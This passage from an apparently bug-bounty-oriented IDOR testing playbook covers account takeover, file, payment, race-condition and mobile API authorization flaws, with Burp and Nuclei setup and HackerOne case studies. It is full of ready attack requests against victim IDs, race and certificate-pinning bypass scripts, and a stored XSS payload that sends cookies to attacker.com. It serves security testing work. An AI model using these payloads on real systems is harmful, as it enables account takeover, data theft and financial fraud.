            requestPrincipals: ["*"]  # Requires valid JWT — missing this = bypass
```

**mTLS limitation:** mTLS between services proves service identity, not user identity. A compromised service can make requests on behalf of any user.

**GraphQL tenant scoping gaps — test at every level:**
1. Root query with cross-tenant ID — is root resolver scoped?
2. Nested resolvers — does tenant scoping propagate to child resolvers?
3. Mutations with cross-tenant object references in arguments
4. Batch queries mixing own-tenant and cross-tenant IDs

### Multi-Tenant Testing Checklist

```
1. Provision two test accounts in separate tenants/organizations
2. Map every endpoint accepting tenant/org identifier (path, header, body, cookie)
3. For each endpoint: send Tenant A auth with Tenant B resource IDs
4. Test org-switching: headers (X-Org-ID, X-Tenant-ID), cookies, subdomain routing
5. For GraphQL: test every query and mutation with cross-tenant node IDs at root and nested levels
6. Check JWT claims: remove, null, or swap tenant_id, org_id, workspace_id
7. Test shared resources (templates, integrations, files) for cross-tenant access
8. Verify invitation/join flows are tenant-scoped (test cross-tenant invitation acceptance)
9. For microservices: test direct access to internal service endpoints bypassing gateway
10. Check aggregate/export endpoints for cross-tenant data leakage
```

---

## 9. Password Reset and Account Takeover via IDOR

ATO IDORs account for ~8% of findings but carry critical severity.

### Pattern 1: Password Reset Token IDOR

Multi-step reset flows have IDOR at each stage:

**Step 2 — Token validation with cross-user user_id:**
```http
POST /api/auth/verify-reset-token HTTP/1.1
Content-Type: application/json

{"token": "{{YOUR_VALID_TOKEN}}", "user_id": "{{VICTIM_USER_ID}}"}
```

**Step 3 — Password set with mismatched token and user_id:**
```http
POST /api/auth/set-password HTTP/1.1
Content-Type: application/json

{
  "token": "{{YOUR_VALID_TOKEN}}",
  "user_id": "{{VICTIM_USER_ID}}",
  "new_password": "{{TEST_PASSWORD}}"
}
```

### Pattern 2: Email/Phone Change IDOR → ATO Chain

```http
PUT /api/users/{{VICTIM_USER_ID}}/email HTTP/1.1
Authorization: Bearer {{YOUR_TOKEN}}
{"email": "{{ATTACKER_EMAIL}}"}
```

The chain: Change victim email via IDOR → Request password reset for victim → Reset link goes to attacker email → Full account takeover.

**Real case — MTN Group #1272478 (Critical):** Profile update IDOR allowed changing victim's email, enabling password reset and full account takeover.

### Pattern 3: 2FA Disable IDOR

```http
DELETE /api/users/{{VICTIM_USER_ID}}/mfa HTTP/1.1
Authorization: Bearer {{YOUR_TOKEN}}

POST /api/auth/verify-otp HTTP/1.1
{"otp": "{{YOUR_VALID_OTP}}", "user_id": "{{VICTIM_USER_ID}}"}
```

### Pattern 4: Session Fixation via IDOR

```http
POST /api/sessions HTTP/1.1
{"user_id": "{{VICTIM_USER_ID}}", "device_id": "{{ATTACKER_DEVICE}}"}

POST /api/auth/link-device HTTP/1.1
Authorization: Bearer {{YOUR_TOKEN}}
{"target_user_id": "{{VICTIM_USER_ID}}", "device_token": "{{ATTACKER_DEVICE_TOKEN}}"}
```

### Pattern 5: Account Merge/Link IDOR

```http
POST /api/auth/link-social HTTP/1.1
Authorization: Bearer {{YOUR_TOKEN}}
{"provider": "google", "social_token": "{{YOUR_GOOGLE_TOKEN}}", "target_user_id": "{{VICTIM_USER_ID}}"}

POST /api/users/{{VICTIM_USER_ID}}/identities HTTP/1.1
Authorization: Bearer {{YOUR_TOKEN}}
{"provider": "github", "provider_user_id": "{{YOUR_GITHUB_ID}}"}
```

### Pattern 6: OAuth Callback Manipulation

**Missing object scope:** OAuth token scoped to User A successfully accesses User B's resources:
```http
GET /api/v2/users/{{VICTIM_ID}}/documents HTTP/1.1
Authorization: Bearer {{ATTACKER_OAUTH_TOKEN}}
```

**OIDC claim confusion:** Attacker controls an IdP and issues a token with the victim's email, gaining access to the victim's account if the application trusts the email claim as a unique identifier.

**CSRF in OAuth flow:** Missing `state` parameter leads to session fixation. Attacker initiates OAuth flow, obtains callback URL with valid code, tricks victim into completing the flow, linking attacker's identity provider to victim's account.

---

## 10. File and Attachment IDOR

File access IDORs account for ~7% of findings and frequently contain sensitive documents, PII, or financial records.

### Pattern 1: Attachment ID Manipulation

```http
GET /api/attachments/{{VICTIM_ATTACHMENT_ID}} HTTP/1.1
Authorization: Bearer {{YOUR_TOKEN}}

DELETE /api/attachments/{{VICTIM_ATTACHMENT_ID}} HTTP/1.1
Authorization: Bearer {{YOUR_TOKEN}}

PATCH /api/attachments/{{VICTIM_ATTACHMENT_ID}} HTTP/1.1
Authorization: Bearer {{YOUR_TOKEN}}
{"filename": "renamed.pdf", "public": true}
```

### Pattern 2: Cloud Storage Pre-Signed URL IDOR

The API does not validate file ownership before generating the signed URL:
```http
GET /api/files/{{VICTIM_FILE_ID}}/download-url HTTP/1.1   — S3 pre-signed URL
GET /api/storage/sas?container={{VICTIM_CONTAINER}}&blob={{VICTIM_BLOB}}  — Azure SAS
POST /api/files/generate-signed-url HTTP/1.1               — GCS signed URL
{"bucket": "{{BUCKET}}", "object": "{{VICTIM_OBJECT_PATH}}"}
```

Also check predictable bucket naming: `s3.amazonaws.com/{{APP}}-{{VICTIM_ORG_ID}}/uploads/`

### Pattern 3: Preview/Thumbnail Endpoint Bypass

The full file download may be protected but the preview endpoint is not:
```http
GET /api/files/{{VICTIM_FILE_ID}}/preview HTTP/1.1
GET /api/files/{{VICTIM_FILE_ID}}/thumbnail?size=large HTTP/1.1
GET /api/documents/{{VICTIM_DOC_ID}}/render?format=png HTTP/1.1
```

**Real case — Nextcloud #1784681 (CVE-2023-25160, Medium):** Nextcloud Mail IDOR allowed reading email subjects and preview text from any user's mailbox by manipulating the mailbox ID parameter.

### Pattern 4: Path Traversal + IDOR

```http
GET /api/exports/download?file=../../{{VICTIM_TENANT}}/report.pdf HTTP/1.1
GET /api/files?path=/users/{{VICTIM_USER_ID}}/documents/secret.pdf HTTP/1.1
GET /api/attachments/download?filepath={{URL_ENCODED_PATH_TO_VICTIM_FILE}} HTTP/1.1
```

### Pattern 5: Upload to Victim's Storage (Overwriting Files)

```http
POST /api/users/{{VICTIM_USER_ID}}/avatar HTTP/1.1
Authorization: Bearer {{YOUR_TOKEN}}
Content-Type: multipart/form-data
[benign test file: text/plain with "IDOR_TEST" content]

PUT /api/files/upload HTTP/1.1
Authorization: Bearer {{YOUR_TOKEN}}
{"user_id": "{{VICTIM_USER_ID}}", "path": "/documents/", "file": "..."}
```

### Pattern 6: Export Endpoint IDOR

Export/report endpoints frequently have weaker authorization:
```http
GET /api/reports/export?user_id={{VICTIM_ID}}&format=csv HTTP/1.1
GET /api/exports/{{VICTIM_EXPORT_ID}}/download HTTP/1.1
Authorization: Bearer {{YOUR_TOKEN}}
```

**Real case — HackerOne #510759 (Low):** `POST /reports/export` with `report_ids[]` from other teams leaked Custom Field Attribute IDs in the CSV header.

### File IDOR Action Checklist

```
1. Upload a test file from each account. Note file IDs, attachment IDs, URLs returned.
2. Analyze file URLs for predictable patterns (sequential IDs, user ID in path, timestamps)
3. Using Account A's token: try to download Account B's file by ID
4. Using Account A's token: try to access Account B's file preview/thumbnail
5. Using Account A's token: try to upload a file to Account B's storage (change user_id)
6. Using Account A's token: try to delete Account B's file attachment
7. Test pre-signed URL generation endpoints with Account B's file IDs
8. Check if file URLs are accessible without any authentication
9. Test export endpoints with Account B's user_id or account_id
10. Test path traversal on download endpoints
```

---

## 11. Payment and Financial IDOR

Payment IDORs are ~4% of findings but have the highest impact-to-frequency ratio. Bounties range $1,000–$15,000+.

### Payment IDOR Attack Surface

| Pattern | Impact | Example |
|---------|--------|---------|
| Invoice ID enumeration | Read other tenants' invoices | PayPal #415081 ($10,500) |
| Subscription cross-access | Cancel/upgrade other user's plan | CVE-2026-70476 |
| Coupon multi-use via race | Unlimited discounts | Reverb #759247 |
| Payment method IDOR | View/modify card details | NordVPN #751577 ($1,000) |
| Product-price mismatch | Purchase at wrong price | CVE-2026-81424 |
| Refund to wrong account | Financial fraud | Multiple |

### Key Attack Payloads

**Access another user's invoice:**
```http
GET /api/billing/invoices/{{VICTIM_INVOICE_ID}} HTTP/1.1
Authorization: Bearer {{ATTACKER_TOKEN}}
```

**Cancel another user's subscription (CVE-2026-70476 FlowiseAI pattern):**
```http
POST /api/billing/cancel-subscription HTTP/1.1
Authorization: Bearer {{ATTACKER_TOKEN}}
Content-Type: application/json

{"subscriptionId": "{{VICTIM_SUBSCRIPTION_ID}}"}
```

**Stripe customer ID manipulation:**
```http
POST /api/billing/charge HTTP/1.1
Authorization: Bearer {{ATTACKER_TOKEN}}
Content-Type: application/json

{"customer_id": "{{VICTIM_STRIPE_CUS_ID}}", "amount": 100, "source": "{{ATTACKER_CARD_TOKEN}}"}
```

**Product-price mismatch (CVE-2026-81424 pattern):**
```http
POST /api/checkout HTTP/1.1
Authorization: Bearer {{ATTACKER_TOKEN}}
Content-Type: application/json

{"product_id": "{{EXPENSIVE_PRODUCT_ID}}", "price_id": "{{CHEAP_PRICE_ID}}"}
```

**Refund to attacker account:**
```http
POST /api/refunds HTTP/1.1
Authorization: Bearer {{ATTACKER_TOKEN}}
Content-Type: application/json

{"payment_id": "{{VICTIM_PAYMENT_ID}}", "refund_to": "{{ATTACKER_BANK_ACCOUNT}}"}
```

**GraphQL billing document download (Shopify #2207248 pattern):**
```json
{
  "query": "{ billingDocumentDownload(documentId: \"gid://shopify/BillingDocument/{{VICTIM_DOC_INT_ID}}\") { url } }"
}
```

**WordPress WP Full Pay (CVE-2026-77789 pattern — no nonce, no ownership check):**
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Cookie: {{ATTACKER_SESSION_COOKIE}}
Content-Type: application/x-www-form-urlencoded

action=wpfp_cancel_subscription&subscription_id={{VICTIM_SUBSCRIPTION_ID}}
```

### Stripe Integration Attack Vectors

Stripe trusts whatever the backend sends. The backend must verify all Stripe IDs belong to the authenticated user:
- **Customer ID manipulation:** Pass another user's `cus_` ID in charge requests
- **Subscription ID manipulation:** Use another user's `sub_` ID in cancel/update (CVE-2026-70476)
- **Price ID mismatch:** Pair expensive `prod_` ID with cheap `price_` ID (CVE-2026-81424)
- **Checkout session manipulation:** Modify `line_items` or `customer` in session creation

### Payment IDOR Checklist

```
1. Map all billing, payment, invoice, and subscription endpoints
2. Create two test accounts with separate payment methods and subscriptions
3. Test invoice access: request Account B's invoice with Account A's token
4. Test subscription operations: cancel/upgrade/downgrade across accounts
5. Check for Stripe ID manipulation: swap cus_, sub_, price_ IDs
6. Test product-price mismatch: expensive product with cheap price ID
7. Test refund endpoints for cross-account refund initiation
8. Test GraphQL billing queries for cross-tenant access
9. Check coupon endpoints for cross-user application and race-condition abuse
10. For WordPress sites: check payment plugin endpoints for IDOR
```

---

## 12. Race Condition + IDOR Chains

### Single-Packet Attack (James Kettle, PortSwigger Research)

Traditional race attacks are unreliable due to network jitter. The single-packet technique packs 20–30 HTTP/2 requests into a single TCP packet, ensuring they arrive and are processed within the same server-side event loop tick.

**HTTP/2 Single-Packet (Turbo Intruder):**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          requestsPerConnection=100,
                          pipeline=False,
                          engine=Engine.HTTP2)
    for i in range(30):
        engine.queue(target.req, gate='race')
    engine.openGate('race')  # All 30 sent simultaneously

def handleResponse(req, interesting):
    if '200' in req.response:
        table.add(req)
```

**HTTP/1.1 Last-Byte Synchronization (when HTTP/2 unavailable):**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=30,
                          requestsPerConnection=1,
                          engine=Engine.HTTP1)
    for i in range(30):
        engine.queue(target.req, gate='race',
                     pauseMarker=['\r\n\r\n'],
                     pauseBefore=True)
    engine.openGate('race')  # Final byte of ALL connections at once
```

**H2SpaceX (standalone Python framework):**
```python
from h2spacex import H2SinglePacketRaceCondition

racer = H2SinglePacketRaceCondition(
    target_url="https://target.com/api/redeem",
    request_count=25,
    method="POST",
    headers={"Authorization": "Bearer token"},
    body='{"coupon": "DISCOUNT50"}'
)
results = racer.execute()
successes = [r for r in results if r.status == 200]
# Expected: 1 success. Multiple = race condition confirmed.
```

### Race Condition Impact Table

| Race Target | Normal Impact | With Single-Packet |
|------------|---------------|-------------------|
| Coupon redemption | Occasional double-use | Deterministic 20–30x use |
| Account creation limit | Bypass by 1-2 | Bypass by 20-30 |
| Vote/like manipulation | Marginal inflation | 30x inflation per packet |
| Free trial extension | Rare success | Reliable trial stacking |
| Seat/subscriber limit | Occasional extra | Exceed by 20-30 |
| Payment deduplication | Rare duplicate | Reliable multi-charge |

### TOCTOU IDOR Pattern

```
Thread 1: CHECK(user owns obj) --- gap --- USE(obj)
                                    |
Thread 2:      MODIFY(obj ownership) ←
(Ownership changed during the gap; check passes, access proceeds)
```

### Specific Race Condition Attack Techniques

**Coupon/Voucher Double Redemption:**
```http
POST /api/redeem HTTP/1.1
Content-Type: application/json
{"coupon_code": "FREESHIP", "order_id": "order_1001"}
```
Send 30 simultaneously. If >1 succeeds: race condition confirmed.
**Real case — Reverb.com #759247 (298 upvotes):** Multiple coupon redemptions succeeded.

**Seat Limit Bypass:**
```http
POST /api/workspace/members HTTP/1.1
{"email": "user1@test.com"}
```
Send 20 copies simultaneously → 20 members despite limit of 10.
**Real case — SingleStore #3221185 (69 upvotes).**

**Duplicate Transaction:**
```http
POST /api/payments/process HTTP/1.1
{"transaction_id": "txn_123", "amount": 100}
```
25 simultaneous requests → check if multiple payments processed.
**Real case — HackerOne #429026 (235 upvotes).**

**Rate Limit Bypass for ID Enumeration:**
```python
# Turbo Intruder: enumerate IDs past rate limits in one burst
for victim_id in range(1000, 1030):
    modified_req = target.req.replace("id=FUZZ", f"id={victim_id}")
    engine.queue(modified_req, gate='race')
engine.openGate('race')
```

### Race Condition Testing Checklist

```
1. Identify endpoints with once-only operations: coupon redemption, vote, trial activation, payment
2. Test each with 25-30 simultaneous identical requests using Turbo Intruder or H2SpaceX
3. Count how many succeed — if more than one, race condition confirmed
4. For TOCTOU: identify separate check-then-act database operations (look for no FOR UPDATE lock)
5. Test invite/join flows: race acceptance against revocation
6. Test ownership-transfer endpoints: race transfer with concurrent reads
7. Use single-packet technique to bypass rate limits during ID enumeration
8. Check for idempotency key enforcement — replay same request with and without idempotency key
9. Document exact number of duplicate operations achieved per single-packet burst
10. Test both HTTP/2 single-packet and HTTP/1.1 last-byte-sync
```

---

## 13. Mobile API IDOR from Reverse Engineering

Mobile APIs account for ~3% of IDOR findings but are disproportionately likely to contain authorization gaps due to certificate pinning false confidence and legacy endpoint blind spots.

### APK Decompilation Workflow

```bash
# Decompile APK
jadx -d output/ target.apk

# Extract API endpoints with ID parameters
grep -rn "api/" output/ | grep -E "(userId|user_id|id|uuid|accountId)"

# Find hardcoded API keys
grep -rn "api[_-]key\|apiKey\|API_KEY" output/

# Find base URLs
grep -rn "https://api\.\|/api/v" output/

# iOS: check URL scheme registrations (deep links)
# cat Info.plist | grep CFBundleURLSchemes -A 10
```

### Certificate Pinning Bypass

| Tool | Platform | Success Rate | Avg Time |
|------|----------|-------------|---------|
| Objection | iOS + Android | ~68% | <5 min |
| Frida + custom script | iOS + Android | ~86% | <5 min |
| apk-mitm | Android | ~75% | <5 min |
| SSL Kill Switch 2 | iOS (jailbroken) | ~90% | <5 min |

```bash
# Android Frida bypass
pip install frida-tools
adb push frida-server /data/local/tmp/
frida -U -l ssl_pinning_bypass.js -f com.target.app --no-pause

# iOS Objection bypass
pip install objection
objection -g "Target App" explore
# then: ios sslpinning disable
```

Pinning is a speed bump, not a security boundary. Average bypass time is under 5 minutes. Server-side authorization is mandatory regardless of transport controls.

### Mobile-Specific IDOR Vectors

**Push notification token IDOR:**
```http
POST /api/push/register HTTP/1.1
Authorization: Bearer {{ATTACKER_TOKEN}}
Content-Type: application/json

{"device_token": "{{ATTACKER_DEVICE_TOKEN}}", "user_id": "{{VICTIM_USER_ID}}"}
```
Register attacker's device token against victim's user ID to receive their push notifications.

**Deep link parameter tampering:**
```
myapp://order/detail?order_id={{VICTIM_ORDER_ID}}
myapp://profile?user_id={{VICTIM_USER_ID}}
myapp://document/view?doc_id={{VICTIM_DOC_ID}}
```
If the app forwards parameters to the API without re-validating authorization, the attacker views another user's data.

**Legacy API version exploitation:**
```http
GET /api/v1/users/{{VICTIM_USER_ID}} HTTP/1.1
Authorization: Bearer {{ATTACKER_TOKEN}}
X-App-Version: 1.0.0
```
Mobile apps may pin to older API versions. Test `/api/v1/` when current is `/api/v3/` — older versions frequently lack authorization checks.

**WebSocket channel subscription IDOR:**
```javascript
const ws = new WebSocket('wss://{{TARGET_HOST}}/ws?token={{ATTACKER_TOKEN}}');
ws.onopen = () => {
  ws.send(JSON.stringify({
    action: 'subscribe',
    channel: 'user.{{VICTIM_USER_ID}}.notifications'
  }));
};
ws.onmessage = (event) => { console.log('Intercepted:', JSON.parse(event.data)); };
```

**gRPC IDOR:**
```bash
# Enumerate services if reflection is enabled
grpcurl -plaintext target.com:50051 list

# Access another user's data
grpcurl -plaintext -H "Authorization: Bearer {{ATTACKER_TOKEN}}" \
  -d '{"user_id": {{VICTIM_USER_ID}}}' \
  {{TARGET_HOST}}:{{GRPC_PORT}} user.UserService/GetUser
```

**gRPC-Web:** Browser-based gRPC uses `Content-Type: application/grpc-web+proto`. Inspect with grpc-web-devtools extension.

**Device-bound session manipulation:**
```http
GET /api/user/profile HTTP/1.1
X-Device-ID: {{VICTIM_DEVICE_ID}}
Authorization: Bearer {{ATTACKER_TOKEN}}
```

### Mobile IDOR Kill Chain

```
1. Decompile: extract API endpoints and hardcoded keys (jadx + MobSF)
2. Bypass pinning: intercept live traffic (Frida/Objection)
3. Map API: identify all endpoints with object references during normal usage
4. Cross-account test: replay requests with modified IDs
5. Deep link abuse: craft links with victim object IDs
6. Push token IDOR: register attacker device for victim notifications
7. Test zombie endpoints: older API versions from decompiled code
```

### Real Mobile IDOR Cases

- **BCM Messenger #668439:** Android app served any attachment given a valid ID regardless of conversation membership. Time-based (epoch-derived) IDs were predictable. Attacker brute-forced to download private photos/documents from any conversation.
- **TikTok #1392630:** Mobile API for TikTok seller platform let any seller view other sellers' support tickets by modifying the ticket identifier. Exposed sensitive business info and private communications.
- **Twitter/MoPub #544329 ($289):** IDOR in mobile advertising platform exposed order statistics for any order ID via sequential ID enumeration.

---

## 14. Chained IDOR Escalation Patterns

Individual IDORs often rate Low or Medium severity. Chained together, they reach Critical. Always report the full chain's impact, not individual bug severity.

### Chain 1: IDOR → Account Takeover (4 paths)

**Path 1 — Email Change:**
```
IDOR write on /api/users/VICTIM/email
→ Change email to attacker@evil.com
→ Request password reset
→ Full account takeover
```
Real case: MTN Group #1272478 (Critical)

**Path 2 — Token/Secret Leak:**
```
IDOR read on endpoint exposing session tokens/API keys/invitation tokens
→ Use leaked token to access victim's account
```
Real case: Stripe/Taxjar #1581240 — Invitation token leak → mass account takeover

**Path 3 — Secondary User Rebinding:**
```
IDOR write adds attacker as secondary user/admin on victim's business account
→ Full access to business functions and financial data
```
Real case: PayPal #415081 ($10,500)

**Path 4 — 2FA/Recovery Modification:**
```
IDOR write on security settings (recovery email, phone, 2FA)
→ Account takeover via modified recovery channel
```

### Chain 2: IDOR + XSS → Stored XSS via IDOR Write

```http
PUT /api/users/VICTIM_ID/bio HTTP/1.1
Authorization: Bearer attacker_token
{"bio": "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"}
```

When the victim views their own profile, the XSS fires. The payload is stored on the victim's own data, bypassing same-origin defenses.

### Chain 3: IDOR + SSRF → Internal Service Access

```http
POST /api/fetch-url HTTP/1.1
{"url": "http://internal-api:8080/admin/users/42/billing"}
```

Internal services often skip authorization checks because they are not expected to be reachable from outside. SSRF provides that reach.

### Chain 4: List IDOR + Detail IDOR → Mass Data Exfiltration

```
1. GET /api/users → returns all user IDs (list IDOR — may be classified as low severity)
2. GET /api/users/{id}/full-profile → returns PII for each ID (detail IDOR)
3. Automate: iterate all IDs from step 1 through step 2
4. Result: complete database exfiltration via two individually-medium IDORs
```

### Chain 5: IDOR + Race Condition → Financial Fraud

```
1. Find IDOR on coupon redeem endpoint: POST /api/coupons/redeem
2. Use single-packet attack to send 30 simultaneous redemptions
3. Some requests bypass the "already redeemed" check due to race
4. Coupon applied multiple times across different accounts
```

### Chain 6: Fix Bypass via Nested/Encoded Parameters

When a fix blocks parameter X at location L, test at:
1. Nested: `attributes.X`, `data.X`, `params.X`
2. Encodings: `base64(X)`, URL-encoded, unicode
3. Different content types: JSON → XML, form-urlencoded, multipart
4. Different HTTP methods: POST vs PUT vs PATCH
5. Array wrapping: `[X]` instead of `X`
6. Type juggling: string("123") vs int(123)
7. Older API versions: `/v1/` instead of `/v3/`

**Real example:** GitLab #743953 ($20K) — fix blocked `_ids` at top level. GitLab #767770 ($20K) — bypass via nested `attributes.issue_ids`. Combined: **$40,000** for one vulnerability class.

### Chaining Action Checklist

```
1. Map ALL IDORs found (even low-severity). Build matrix: endpoint, method, data, severity.
2. Identify data dependencies: does IDOR-A leak data needed to exploit IDOR-B?
3. Test IDOR-to-ATO paths: email change, token leak, secondary user rebinding, recovery modification
4. Combine IDOR read (list) + IDOR read (detail) for mass exfiltration potential
5. Test IDOR write + XSS: inject stored payloads into victim's objects
6. Test temporal/workflow persistence: revoke access and re-test with old sessions after delays
7. After a fix is deployed: test bypasses via nesting, encoding, method changes, API version downgrades
8. For every chain, document: individual severities, combined severity, and full business impact
9. Report the chain as one finding, not separate bugs — demonstrate the escalated impact
```

---

## 15. Burp Suite Configuration for IDOR

### Autorize Setup (Primary IDOR Detection Tool — 5/5 stars)

Autorize automatically replays every intercepted request with a low-privilege session and flags where the response is similar to the authorized response.

```
Step 1: Install
  Extender → BApp Store → Search "Autorize" → Install

Step 2: Configure Low-Privilege Session
  - Login as User B (low-privilege) in a separate browser
  - Copy User B's session cookie or bearer token
  - In Autorize tab → "Authorization Enforcement" section:
    Add header: Cookie: session=user_b_session_value
    OR: Authorization: Bearer user_b_token

Step 3: Configure Scope
  - Open "Interception Filters" tab
  - Enable "Intercept requests in scope only"
  - Add target domain to Burp scope (Target → Scope)

Step 4: Enable and Browse
  - Click "Autorize is turned off" → turns green
  - Browse as User A (high-privilege) through all application features
  - Autorize automatically replays every request with User B's session

Step 5: Interpret Results
  - Green (Bypassed): Same response = IDOR FOUND
  - Red (Enforced): Different/403/404 = Properly authorized
  - Orange (Potentially Bypassed): Needs manual review

Step 6: Review
  - Sort by "Authorization Enforcement Status"
  - Click green entries
  - Compare Original vs Modified response body side-by-side
  - Verify actual data differences, not just status codes
```

### AuthMatrix Plugin (Multi-Role Testing — 4/5 stars)

```
1. Define roles: admin, regular_user, guest, unauthenticated
2. Assign session tokens to each role
3. Select target endpoints from Burp sitemap
4. Mark expected access for each endpoint-role combination
5. Run the matrix — AuthMatrix replays each request as each role
6. Any cell showing unexpected access = authorization flaw
```

### Burp Intruder for ID Enumeration

```
Target: GET /api/users/FUZZ/profile
Payload type: Numbers, From 1, To 10000, Step 1
Resource pool: 1-5 concurrent requests (avoid rate limiting)
Grep - Match: patterns like "email", "phone", "address" to flag data leaks
Grep - Extract: Extract response fields for comparison
Filter results by response length differences (varying length = different user data)
```

### Logger++ Filters for IDOR-Relevant Requests

Configure Logger++ to highlight requests containing object references:
```
Request.Path MATCHES ".*\/[0-9]+.*"
OR Request.Path MATCHES ".*[0-9a-f]{8}-[0-9a-f]{4}.*"
OR Request.Body CONTAINS "user_id"
OR Request.Body CONTAINS "org_id"
OR Request.Body CONTAINS "tenant_id"
OR Request.QueryString CONTAINS "_id"
```

### Match/Replace Rules for ID Swapping

Under Proxy → Options → Match and Replace:
```
Type: Request header
Match: X-Tenant-ID: tenant_a_id
Replace: X-Tenant-ID: tenant_b_id

Type: Request body
Match: "user_id":"attacker_id"
Replace: "user_id":"victim_id"
```

### Two-Tab Comparison Technique (Repeater)

```
1. Send legitimate request to Repeater (Tab 1)
2. Duplicate tab (right-click → Duplicate tab) → Tab 2
3. In Tab 2, replace all object IDs with another user's IDs
4. Send both → compare responses side-by-side
5. Same status code + different data in body = confirmed IDOR
```

---

## 16. Nuclei Templates for IDOR

### Template 1: Numeric ID IDOR Detection

```yaml
id: idor-numeric-id
info:
  name: IDOR via Numeric ID Manipulation
  author: playbook
  severity: high
  tags: idor,bola,authorization

http:
  - raw:
      - |
        GET /api/{{resource}}/{{owned_id}} HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{token}}

      - |
        GET /api/{{resource}}/{{unowned_id}} HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{token}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200"
          - "status_code_2 == 200"
          - "body_1 != body_2"
          - "len(body_2) > 100"

    extractors:
      - type: dsl
        dsl:
          - "body_2"
        name: leaked_data
```

**Usage:** `nuclei -u https://api.target.com -t ./idor-numeric-id.yaml -V token=TOKEN -V resource=orders -V owned_id=123 -V unowned_id=456`

### Template 2: Cross-Tenant IDOR

```yaml
id: idor-cross-tenant
info:
  name: Cross-Tenant IDOR Detection
  severity: critical
  tags: idor,bola,multi-tenant

http:
  - raw:
      - |
        GET /api/organizations/{{attacker_org}}/data HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{attacker_token}}

      - |
        GET /api/organizations/{{victim_org}}/data HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{attacker_token}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200"
          - "status_code_2 == 200"
        condition: and

      - type: word
        words:
          - "\"organization_id\""
          - "\"data\""
        part: body_2
        condition: and
```

### Template 3: GraphQL IDOR via Node Interface

```yaml
id: graphql-idor-node-interface
info:
  name: GraphQL IDOR via Node Interface
  severity: high
  tags: idor,graphql,bola

http:
  - raw:
      - |
        POST /graphql HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Authorization: Bearer {{token}}

        {"query":"{ node(id: \"{{target_node_id}}\") { ... on User { id email name } ... on Document { id title content } ... on Invoice { id amount customerEmail } } }"}

    matchers-condition: and
    matchers:
      - type: status
        status: [200]

      - type: word
        words:
          - "\"email\""
          - "\"content\""
          - "\"customerEmail\""
        condition: or
        part: body

      - type: word
        words:
          - "\"errors\""
        negative: true
        part: body
```

### Template 4: UUID Multi-Step Workflow

```yaml
id: idor-uuid-workflow
info:
  name: IDOR via UUID Manipulation (Multi-Step)
  severity: high
  tags: idor,uuid,workflow

http:
  - raw:
      - |
        GET /api/documents HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{token}}
    extractors:
      - type: regex
        name: uuid_format
        regex:
          - '"id":"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"'
        internal: true

  - raw:
      - |
        GET /api/documents/{{target_uuid}} HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{token}}
    matchers:
      - type: dsl
        dsl:
          - "status_code == 200 && contains(body, 'content')"
```

### IDOR Matcher Reference

| Matcher | Use Case |
|---------|----------|
| `status_code_1 == 200 && status_code_2 == 200` | Both requests succeed |
| `body_1 != body_2` | Different data returned |
| `len(body_2) > 100` | Substantial response content |
| `contains(body, 'email')` | Sensitive fields present |
| `negative: true` on `"errors"` | No GraphQL error |

### CI/CD Integration

```bash
# Run against target
nuclei -u https://api.target.com -t ./idor-templates/ \
  -V token=test_token -V owned_id=123 -V unowned_id=456 \
  -severity high,critical -stats

# GitHub Actions
# uses: projectdiscovery/nuclei-action@main
# with:
#   target: http://localhost:8080
#   templates: ./security/nuclei-templates/idor/
```

---

## 17. Real HackerOne Case Studies

### GitLab #743953 ($20,000) — Foreign-Key Array Injection

**Attack:** Craft a malicious GitLab project export tarball with `issue_ids` and `merge_request_iids` referencing private objects from other projects. When imported, GitLab moves those private objects into the attacker's project.

**Root cause:** Project import did not validate that referenced object IDs belonged to the importing user's projects. Blindly associated referenced objects with the newly imported project.

**Fix bypass (Report #767770, another $20,000):** Initial fix blocked `_ids` at top level. Bypass via `attributes.issue_ids` (nested attribute). Lesson: Blocklist-to-allowlist migration required.

**Combined: $40,000 for one vulnerability class.** Key insight: Import/export features process bulk object references. Each reference must be ownership-validated.

### Snapchat #1819832 ($15,000) — Destructive GraphQL Mutation

**Attack:** Swap `ids` parameter in `DeleteStorySnaps` GraphQL mutation to delete any user's Spotlight content.

**Root cause:** GraphQL mutation resolver had no ownership check on the `ids` array.

**Key pattern:** Destructive mutations (delete, cancel) are the highest-impact IDOR attack surface and also the most commonly missed in security reviews.

### HackerOne #2122671 — Mass-Delete User Certifications

**Attack:** Change the sequential integer license/certification ID in a GraphQL delete mutation. Iterate through ranges to mass-delete certifications across all users.

**Root cause:** GraphQL resolver accepted certification ID without verifying the authenticated user owned it. Sequential IDs made mass exploitation trivial.

**Key pattern:** Profile management endpoints (licenses, certifications, credentials) must validate ownership before delete operations.

### PayPal #415081 ($10,500) — Secondary User Rebinding

**Attack:** Add secondary users from other business accounts to attacker's PayPal business account by manipulating the user identifier in the assignment request (POST body).

**Root cause:** Server added the user to the attacker's business account without ownership validation — classic Object Rebinding family.

### Uber #1145428 ($5,750) — Three-Bug Chain

**Chain:**
1. Bug 1: Voucher ID enumeration (IDOR info disclosure)
2. Bug 2: Voucher target modification (IDOR write)
3. Bug 3: Authentication bypass on voucher application

**Combined impact:** Any Uber for Business user charges any amount to any business account's credit card.

**Key lesson:** Chaining multiplies bounty 2–5x. Report the chain's combined severity, not individual bug severity.

### Shopify #2207248 ($5,000) — Cross-Tenant Billing

**Attack:** Staff of one Shopify store read billing invoices of other stores by swapping sequential `BillingInvoice` IDs in GraphQL `BillingDocumentDownload` and `BillDetails` operations.

**Root cause:** GraphQL resolver did not validate the invoice belonged to the requester's store. Sequential integer IDs made enumeration trivial.

### Reddit #1658418 ($5,000) — Moderator Logs Cross-Tenant

